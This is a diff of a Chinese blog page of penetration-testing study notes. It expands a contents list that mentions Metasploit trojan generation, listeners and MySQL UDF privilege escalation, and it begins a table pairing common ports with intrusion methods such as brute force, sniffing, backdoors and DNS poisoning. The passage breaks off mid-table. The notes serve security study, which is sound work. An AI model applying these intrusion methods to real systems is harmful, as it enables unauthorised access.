@@ -5,17 +5,17 @@
   
 
   
-  <title>Penetration Testing Knowledge | Lunatic&#39;s Workstation</title>
+  <title>Penetration Testing | Lunatic&#39;s Workstation</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="某人为了能顺利找到实习，现在来恶补渗透测试的知识QAQ">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Penetration Testing Knowledge">
-<meta property="og:url" content="https://goodlunatic.github.io/2023/09/20/Penetration%20Testing%20Knowledge/index.html">
+<meta property="og:title" content="Penetration Testing">
+<meta property="og:url" content="https://goodlunatic.github.io/2023/10/06/Penetration%20Testing/index.html">
 <meta property="og:site_name" content="Lunatic&#39;s Workstation">
 <meta property="og:description" content="某人为了能顺利找到实习，现在来恶补渗透测试的知识QAQ">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-09-20T01:53:02.000Z">
-<meta property="article:modified_time" content="2023-09-20T01:30:35.709Z">
+<meta property="article:published_time" content="2023-10-06T01:53:02.000Z">
+<meta property="article:modified_time" content="2023-10-06T10:38:45.921Z">
 <meta property="article:author" content="Lunatic">
 <meta property="article:tag" content="Skills">
 <meta property="article:tag" content="Web">
@@ -72,11 +72,11 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-Penetration Testing Knowledge" class="article article-type-post" itemscope
+        <section id="main"><article id="post-Penetration Testing" class="article article-type-post" itemscope
   itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2023/09/20/Penetration%20Testing%20Knowledge/" class="article-date">
-  <time datetime="2023-09-20T01:53:02.000Z" itemprop="datePublished">2023-09-20</time>
+    <a href="/2023/10/06/Penetration%20Testing/" class="article-date">
+  <time datetime="2023-10-06T01:53:02.000Z" itemprop="datePublished">2023-10-06</time>
 </a>
     
   <div class="article-category">
@@ -91,7 +91,7 @@
       
   
     <h1 class="article-title" itemprop="name">
-      Penetration Testing Knowledge
+      Penetration Testing
     </h1>
   
 
@@ -102,7 +102,7 @@
       <div class="toc-parent">
   <div id="toc" class="toc-article">
     <div class="toc-title">目录</div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D"><span class="toc-text">基础概念名词</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D"><span class="toc-text">域名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFDNS"><span class="toc-text">什么是DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0-HOSTS-%E4%B8%8E-DNS-%E7%9A%84%E5%85%B3%E7%B3%BB%EF%BC%9F"><span class="toc-text">本地 HOSTS 与 DNS 的关系？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CDN-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%B8%8E-DNS-%E7%9A%84%E5%85%B3%E7%B3%BB%EF%BC%9F"><span class="toc-text">CDN 是什么？与 DNS 的关系？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84-DNS-%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-text">常见的 DNS 安全攻击有哪些？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-text">后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%8E%E9%97%A8%EF%BC%9F%E6%9C%89%E9%82%A3%E4%BA%9B%E5%90%8E%E9%97%A8%EF%BC%9F"><span class="toc-text">什么是后门？有那些后门？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95"><span class="toc-text">数据包拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E5%93%8D%E5%BA%94%E7%A0%81"><span class="toc-text">HTTP响应码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">通信基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81ip%E6%AE%B5-%E6%95%B0%E5%AD%97-%E5%A6%82192-168-0-1-24%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F"><span class="toc-text">一、ip段&#x2F;数字-如192.168.0.1&#x2F;24是什么意思？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%B8%80%E4%B8%AAC%E7%B1%BB%E7%9A%84ip%E6%AE%B5%E4%B8%AD%EF%BC%8C%E6%9C%89%E5%A4%9A%E5%B0%91%E4%B8%AA%E5%8F%AF%E7%94%A8%E7%9A%84ip%E5%9C%B0%E5%9D%80%EF%BC%9F"><span class="toc-text">二、一个C类的ip段中，有多少个可用的ip地址？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#whois%E6%9F%A5%E8%AF%A2"><span class="toc-text">whois查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%87%E6%A1%88%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2"><span class="toc-text">备案信息查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">收集敏感信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF"><span class="toc-text">收集子域名信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95"><span class="toc-text">谷歌语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4%EF%BC%88%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99-amp-%E6%9C%AC%E5%9C%B0%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="toc-text">子域名爆破（在线网站&amp;本地工具）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Maltego"><span class="toc-text">Maltego</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-text">收集常用端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">指纹识别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP"><span class="toc-text">查找真实IP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99Ping%E4%B8%80%E4%B8%8B"><span class="toc-text">在线网站Ping一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-text">查找子域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6"><span class="toc-text">泄露文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-text">网络空间搜索引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%97%81%E7%AB%99IP"><span class="toc-text">查询旁站IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2"><span class="toc-text">证书查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E9%82%AE%E7%AE%B1"><span class="toc-text">内部邮箱</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text">收集敏感目录文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6"><span class="toc-text">社会工程学</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5%E5%BA%93"><span class="toc-text">社工库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">Nmap的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA"><span class="toc-text">扫描目标主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%85%A5%E5%BE%85%E6%89%AB%E6%8F%8F%E7%9A%84%E4%B8%BB%E6%9C%BA%E6%88%96%E7%BD%91%E7%BB%9C%E5%88%97%E8%A1%A8"><span class="toc-text">从文件读入待扫描的主机或网络列表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E9%80%89%E6%8B%A9%E7%9B%AE%E6%A0%87"><span class="toc-text">随机选择目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%92%E9%99%A4%E7%9B%AE%E6%A0%87"><span class="toc-text">排除目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%B1%BB%E5%9E%8B"><span class="toc-text">扫描类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8C%87%E5%AE%9A%E5%92%8C%E6%89%AB%E6%8F%8F%E9%A1%BA%E5%BA%8F"><span class="toc-text">端口指定和扫描顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E7%9A%84%E5%85%AD%E5%A4%A7%E7%8A%B6%E6%80%81"><span class="toc-text">端口的六大状态</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1-%E7%89%88%E6%9C%AC%E5%8F%91%E7%8E%B0"><span class="toc-text">服务&#x2F;版本发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-text">脚本扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-text">操作系统版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E4%B8%8E%E6%80%A7%E8%83%BD"><span class="toc-text">时间与性能</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99-%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1-%E7%BB%95%E8%BF%87"><span class="toc-text">防火墙&#x2F;入侵防御 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%87%BA"><span class="toc-text">输出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9"><span class="toc-text">杂项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%8C%87%E5%AF%BC"><span class="toc-text">参数指导</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E6%AF%94%E8%BE%83%E5%A5%BD%E7%9A%84%E9%92%88%E5%AF%B9owaspbwa%EF%BC%88%E7%BD%91%E7%AB%99%EF%BC%89%E7%9A%84nmap%E6%89%AB%E6%8F%8F%E5%8F%82%E6%95%B0"><span class="toc-text">一个比较好的针对owaspbwa（网站）的nmap扫描参数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">MSF的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%A8%A1%E5%9D%97"><span class="toc-text">查询模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-text">使用模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8msf%E4%B8%AD%E4%BD%BF%E7%94%A8nmap-%E9%9C%80%E8%A6%81root%E6%9D%83%E9%99%90"><span class="toc-text">在msf中使用nmap(需要root权限)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-text">msf生成木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC"><span class="toc-text">msf设置监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E8%AE%BE%E7%BD%AE%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="toc-text">msf设置进程迁移</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D"><span class="toc-text">基础概念名词</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D"><span class="toc-text">域名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFDNS"><span class="toc-text">什么是DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0-HOSTS-%E4%B8%8E-DNS-%E7%9A%84%E5%85%B3%E7%B3%BB%EF%BC%9F"><span class="toc-text">本地 HOSTS 与 DNS 的关系？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CDN-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%B8%8E-DNS-%E7%9A%84%E5%85%B3%E7%B3%BB%EF%BC%9F"><span class="toc-text">CDN 是什么？与 DNS 的关系？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84-DNS-%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-text">常见的 DNS 安全攻击有哪些？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-text">后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%8E%E9%97%A8%EF%BC%9F%E6%9C%89%E9%82%A3%E4%BA%9B%E5%90%8E%E9%97%A8%EF%BC%9F"><span class="toc-text">什么是后门？有那些后门？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95"><span class="toc-text">数据包拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E5%93%8D%E5%BA%94%E7%A0%81"><span class="toc-text">HTTP响应码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">通信基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81ip%E6%AE%B5-%E6%95%B0%E5%AD%97-%E5%A6%82192-168-0-1-24%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F"><span class="toc-text">一、ip段&#x2F;数字-如192.168.0.1&#x2F;24是什么意思？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%B8%80%E4%B8%AAC%E7%B1%BB%E7%9A%84ip%E6%AE%B5%E4%B8%AD%EF%BC%8C%E6%9C%89%E5%A4%9A%E5%B0%91%E4%B8%AA%E5%8F%AF%E7%94%A8%E7%9A%84ip%E5%9C%B0%E5%9D%80%EF%BC%9F"><span class="toc-text">二、一个C类的ip段中，有多少个可用的ip地址？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#whois%E6%9F%A5%E8%AF%A2"><span class="toc-text">whois查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%87%E6%A1%88%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2"><span class="toc-text">备案信息查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">收集敏感信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF"><span class="toc-text">收集子域名信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95"><span class="toc-text">谷歌语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4%EF%BC%88%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99-amp-%E6%9C%AC%E5%9C%B0%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="toc-text">子域名爆破（在线网站&amp;本地工具）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Maltego"><span class="toc-text">Maltego</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-text">收集常用端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">指纹识别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP"><span class="toc-text">查找真实IP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99Ping%E4%B8%80%E4%B8%8B"><span class="toc-text">在线网站Ping一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-text">查找子域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E6%96%87%E4%BB%B6"><span class="toc-text">泄露文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-text">网络空间搜索引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%97%81%E7%AB%99IP"><span class="toc-text">查询旁站IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2"><span class="toc-text">证书查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E9%82%AE%E7%AE%B1"><span class="toc-text">内部邮箱</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text">收集敏感目录文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6"><span class="toc-text">社会工程学</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5%E5%BA%93"><span class="toc-text">社工库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%80%BB%E7%BB%93"><span class="toc-text">黑客常用端口总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#telnet"><span class="toc-text">telnet</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">Nmap的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA"><span class="toc-text">扫描目标主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%85%A5%E5%BE%85%E6%89%AB%E6%8F%8F%E7%9A%84%E4%B8%BB%E6%9C%BA%E6%88%96%E7%BD%91%E7%BB%9C%E5%88%97%E8%A1%A8"><span class="toc-text">从文件读入待扫描的主机或网络列表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E9%80%89%E6%8B%A9%E7%9B%AE%E6%A0%87"><span class="toc-text">随机选择目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%92%E9%99%A4%E7%9B%AE%E6%A0%87"><span class="toc-text">排除目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%B1%BB%E5%9E%8B"><span class="toc-text">扫描类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8C%87%E5%AE%9A%E5%92%8C%E6%89%AB%E6%8F%8F%E9%A1%BA%E5%BA%8F"><span class="toc-text">端口指定和扫描顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E7%9A%84%E5%85%AD%E5%A4%A7%E7%8A%B6%E6%80%81"><span class="toc-text">端口的六大状态</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1-%E7%89%88%E6%9C%AC%E5%8F%91%E7%8E%B0"><span class="toc-text">服务&#x2F;版本发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-text">脚本扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-text">操作系统版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E4%B8%8E%E6%80%A7%E8%83%BD"><span class="toc-text">时间与性能</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99-%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1-%E7%BB%95%E8%BF%87"><span class="toc-text">防火墙&#x2F;入侵防御 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%87%BA"><span class="toc-text">输出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9"><span class="toc-text">杂项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%8C%87%E5%AF%BC"><span class="toc-text">参数指导</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E6%AF%94%E8%BE%83%E5%A5%BD%E7%9A%84%E9%92%88%E5%AF%B9owaspbwa%EF%BC%88%E7%BD%91%E7%AB%99%EF%BC%89%E7%9A%84nmap%E6%89%AB%E6%8F%8F%E5%8F%82%E6%95%B0"><span class="toc-text">一个比较好的针对owaspbwa（网站）的nmap扫描参数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">MSF的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%A8%A1%E5%9D%97"><span class="toc-text">查询模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-text">使用模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8msf%E4%B8%AD%E4%BD%BF%E7%94%A8nmap-%E9%9C%80%E8%A6%81root%E6%9D%83%E9%99%90"><span class="toc-text">在msf中使用nmap(需要root权限)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-text">msf生成木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC"><span class="toc-text">msf设置监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E8%AE%BE%E7%BD%AE%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="toc-text">msf设置进程迁移</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="toc-text">Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-UDF%E6%8F%90%E6%9D%83"><span class="toc-text">MySQL-UDF提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="toc-text">信息扫描工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PEASS-ng"><span class="toc-text">PEASS-ng</span></a></li></ol></li></ol>
   </div>
 </div>
       <p><strong>某人为了能顺利找到实习，现在来恶补渗透测试的知识QAQ</strong></p>
@@ -159,6 +159,219 @@
 <h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><h2 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h2><p>常见思路</p>
 <p>QQ&amp;QQ邮箱<br>支付宝 –&gt; QQ邮箱 –&gt; 真实姓名</p>
 <p>图片 –&gt; 定位</p>
+<h1 id="黑客常用端口总结"><a href="#黑客常用端口总结" class="headerlink" title="黑客常用端口总结"></a>黑客常用端口总结</h1><table>
+<thead>
+<tr>
+<th align="center">端口</th>
+<th align="center">服务</th>
+<th align="center">入侵方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">21</td>
+<td align="center">ftp/tftp/vsftpd文件传输协议</td>
+<td align="center">爆破/嗅探/溢出/后门</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td align="center">ssh远程连接</td>
+<td align="center">爆破/openssh漏洞</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td align="center">Telnet远程连接</td>
+<td align="center">爆破/嗅探/弱口令</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td align="center">SMTP邮件服务</td>
+<td align="center">邮件伪造</td>
+</tr>
+<tr>
+<td align="center">53</td>
+<td align="center">DNS域名解析系统</td>
+<td align="center">域传送/劫持/缓存投毒/欺骗</td>
+</tr>
+<tr>
+<td align="center">67/68</td>
+<td align="center">dhcp服务</td>
+<td align="center">劫持/欺骗</td>
+</tr>
+<tr>
+<td align="center">110</td>
+<td align="center">pop3</td>
+<td align="center">爆破/嗅探</td>
+</tr>
+<tr>
+<td align="center">139</td>
+<td align="center">Samba服务</td>
